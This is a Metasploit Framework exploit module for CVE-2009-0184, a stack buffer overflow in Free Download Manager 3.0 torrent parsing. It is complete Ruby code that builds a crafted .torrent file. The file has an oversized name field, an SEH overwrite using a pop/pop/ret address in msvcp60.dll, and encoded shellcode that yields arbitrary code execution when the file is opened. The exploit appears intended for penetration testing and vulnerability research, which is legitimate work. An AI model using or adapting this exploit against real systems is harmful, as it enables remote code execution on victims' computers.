##
# $Id: fdm_torrent.rb 7455 2009-11-10 21:52:17Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh
        
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Free Download Manager Torrent Parsing Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Free Download Manager
					3.0 Build 844. Arbitrary code execution could occur when parsing a
					specially crafted torrent file.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 'jduck',
			'Version'        => '$Revision: 7455 $',
			'References'     =>
				[
					[ 'CVE', '2009-0184' ],
					[ 'OSVDB', '54033' ],
					[ 'BID', '33555' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},					
			'Payload'        =>
				{
					'Space'    => 1024,
					'DisableNops'   =>  'True',
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
				},
			'Platform' => 'win',
			'Targets'        => 
				[
					[ 'Free Download Manager 3.0 (Build 844)',
						{
							'Ret' => 0x7605112c # pop/pop/ret @ msvcp60.dll
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'February 2 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.torrent']),
			], self.class)
	end

	def exploit
		x = ""

		bof = rand_text_alphanumeric(10004) + generate_seh_payload(target.ret)
		# hit the end of the stack...
		bof << rand_text(20000)
		
		len = rand(10*1024*1024)
		info_hash = {
			'length' => len,
			'name' => bof,
			'piece length' => len + rand(262144 - len),
			'pieces' => rand_text(20),
		}
		  
		ann_hash = {
			'info' => info_hash,
		}
		  
		encoded = bencode_hash(ann_hash)
		
		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(encoded)
		
	end
	
	# bencoding functions:
	#
	# http://wiki.theory.org/BitTorrentSpecification
	#
	def bencode_string(str)
		ret = "%d:" % str.length
		ret << str
		return ret
	end

	def bencode_int(int)
		ret = "i%de" % int
		return ret
	end

	def bencode_item(item)
		case item
		when Fixnum
			return bencode_int(item)
		when String
			return bencode_string(item)
		when Hash
			return bencode_hash(item)
		else
			throw("unsupported bencode data type! " + item.testzt)
		end
	end
	
	def bencode_list(list)
		ret = "l"
		list.each do |el|
			ret << bencode_item(el)
		end
		ret << "e"
		return ret
	end

	def bencode_hash(hash)
		ret = "d"
		hash.keys.sort.each do |k|
			ret << bencode_item(k)
			ret << bencode_item(hash[k])
		end
		ret << "e"
		return ret
	end
	
end
